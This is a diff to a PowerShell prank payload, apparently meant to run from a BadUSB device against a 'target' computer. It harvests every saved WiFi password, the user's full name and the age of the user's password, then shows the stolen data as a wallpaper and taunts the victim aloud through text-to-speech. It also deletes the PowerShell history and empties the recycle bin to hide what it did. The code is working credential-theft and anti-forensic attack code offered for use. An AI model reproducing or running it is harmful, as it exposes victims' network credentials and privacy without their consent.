@@ -27,8 +27,6 @@
 	It determines the last day they changed thier password and how many days ago.
 	Once the information is gathered the script will pause until a mouse movement is detected
 	Then the script uses Sapi speak to roast their set up and lack of security
-	If wifi networks and passwords are detected wallpaper will be changed to image displaying that information
-	Image generated will be saved to desktop, steganography is used to put hidden message at bottom of binary output of image generated
 #>
 ############################################################################################################################################################
 
@@ -46,19 +44,13 @@ $s=New-Object -ComObject SAPI.SpVoice
 
     $fullName = Net User $Env:username | Select-String -Pattern "Full Name";$fullName = ("$fullName").TrimStart("Full Name")
 
-    #$NameArray =$fullName.Split(" ")
-
-    #$firstName = $NameArray[0]
-
-    #$lastName = $NameArray[1]
-
     }
  
- # If no name is detected function will return $null to avoid sapi speak
+ # If no name is detected function will return $env:UserName 
 
     # Write Error is just for troubleshooting 
     catch {Write-Error "No name was detected" 
-    return $null
+    return $env:UserName
     -ErrorAction SilentlyContinue
     }
 
@@ -233,7 +225,7 @@ echo "Wifi pass Done"
 	They will be save in the temp directory to a file named with "$env:USERNAME-$(get-date -f yyyy-MM-dd)_WiFi-PWD.txt"
 #>
 
-
+Function Get-Networks {
 # Get Network Interfaces
 $Network = Get-WmiObject Win32_NetworkAdapterConfiguration | where { $_.MACAddress -notlike $null }  | select Index, Description, IPAddress, DefaultIPGateway, MACAddress | Format-Table Index, Description, IPAddress, DefaultIPGateway, MACAddress 
 
@@ -265,16 +257,11 @@ Foreach($WLANProfileName in $WLANProfileNames){
     $WLANProfileObject | Add-Member -Type NoteProperty -Name "ProfilePassword" -Value $WLANProfilePassword
     $WLANProfileObjects += $WLANProfileObject
     Remove-Variable WLANProfileObject
+	return $WLANProfileObjects
+}
 }
 
-
-#############################################################################################################################################
-
-<#
-
-.NOTES 
-	This will get the dimension of the targets screen to make the wallpaper
-#>
+$Networks = Get-Networks
 
 Add-Type @"
 using System;
@@ -287,8 +274,6 @@ public class PInvoke {
 $hdc = [PInvoke]::GetDC([IntPtr]::Zero)
 $w = [PInvoke]::GetDeviceCaps($hdc, 118) # width
 $h = [PInvoke]::GetDeviceCaps($hdc, 117) # height
-
-#############################################################################################################################################
 
 <#
 
@@ -375,21 +360,19 @@ public class Params
 
 #############################################################################################################################################
 
-	
-    if (!$WLANProfileObjects) { Write-Host "variable is null" 
-    }else { 
+Function WallPaper-Troll {
 
-	# This is the name of the file the networks and passwords are saved to and later uploaded to the DropBox Cloud Storage
+if (!$Networks) { Write-Host "variable is null" 
+}else { 
+
+	# This is the name of the file the networks and passwords are saved 
 
 	$FileName = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_WiFi-PWD.txt"
 
-	"W-Lan profiles: 
-	=================================================================="+ ($WLANProfileObjects| Out-String) >> $Env:temp\$FileName
+	($Networks| Out-String) >> $Env:temp\$FileName
 
 	$content = [IO.File]::ReadAllText("$Env:temp\$FileName")
 
-
-#############################################################################################################################################
 
 # this is the message that will be coded into the image you use as the wallpaper
 
@@ -398,8 +381,6 @@ public class Params
 # this will be the name of the image you use as the wallpaper
 
 	$ImageName = "dont-be-suspicious"
-
-#############################################################################################################################################
 
 <#
 
@@ -422,8 +403,6 @@ public class Params
 
 # Invoke-Item $filename 
 
-#############################################################################################################################################
-
 <#
 
 .NOTES 
@@ -440,23 +419,23 @@ public class Params
 #############################################################################################################################################
 
 
-# This is a function that will open up notepad with all their saved networks and passwords and taunt them
+# This will open up notepad with all their saved networks and passwords and taunt them
 
-	function Get-All_Pwds {
-    		$s.Speak("wanna see something really cool?")
-		Set-WallPaper -Image "$Env:USERPROFILE\Desktop\$ImageName.jpg" -Style Center
-    		#notepad $Env:temp\$FileName
-    		$s.Speak("Look at all your other passswords I got..")
-    		Start-Sleep -Seconds 1
-    		$s.Speak("These are the wifi passwords for every network you've ever connected to!")
-    		Start-Sleep -Seconds 1
-    		$s.Speak("I could send them to myself but i wont")
-    		#taskkill /im notepad.exe /f
-    	}
+
+	$s.Speak("wanna see something really cool?")
+	Set-WallPaper -Image "$Env:USERPROFILE\Desktop\$ImageName.jpg" -Style Center
+	$s.Speak("Look at all your other passswords I got..")
+	Start-Sleep -Seconds 1
+	$s.Speak("These are the wifi passwords for every network you've ever connected to!")
+	Start-Sleep -Seconds 1
+	$s.Speak("I could send them to myself but i wont")
+
 }
 
 # echo statement used to track progress while debugging
 echo "All Wifi Passes Done"
+}
+
 
 ###########################################################################################################
 
@@ -671,7 +650,7 @@ $s.Speak($PUB_IPwarn)
 
 $s.Speak($PASSwarn)
 
-Get-All_Pwds
+WallPaper-Troll
 
 $s.Speak($LAST_PASSwarn)
 
@@ -683,7 +662,7 @@ $s.Speak($OUTRO)
 
 # this snippet will leave a message on your targets desktop 
 
-$message = "`You have been hacked, with love -Jakoby"
+$message = "`nMy crime is that of curiosity `nand yea curiosity killed the cat `nbut satisfaction brought him back"
 
 Add-Content $home\Desktop\WithLove.txt $message
 ###########################################################################################################
@@ -709,5 +688,7 @@ Remove-Item (Get-PSreadlineOption).HistorySavePath
 # Deletes contents of recycle bin
 
 Clear-RecycleBin -Force -ErrorAction SilentlyContinue
+
+###########################################################################################################
 
 ###########################################################################################################
